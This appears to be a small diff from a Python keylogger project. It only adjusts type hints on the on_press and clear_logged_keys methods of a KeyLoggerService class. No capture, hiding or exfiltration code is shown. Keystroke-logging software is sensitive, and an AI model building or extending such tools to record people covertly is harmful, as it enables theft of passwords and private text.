@@ -14,7 +14,7 @@ class KeyLoggerService(IKeyLogger):
         self.__last_type_time = None
         self.__last_window = None
 
-    def on_press(self, key) -> None:
+    def on_press(self, key:str) -> None:
         key = ToolBox.format_key(key)
         if key == "":
             return
@@ -34,7 +34,7 @@ class KeyLoggerService(IKeyLogger):
     def get_logged_keys(self) -> dict[str:str]:
         return self.__logged_keys
 
-    def clear_logged_keys(self) -> dict[str:str]:
+    def clear_logged_keys(self):
         self.__logged_keys = {}
 
 class FileWriter(Write):
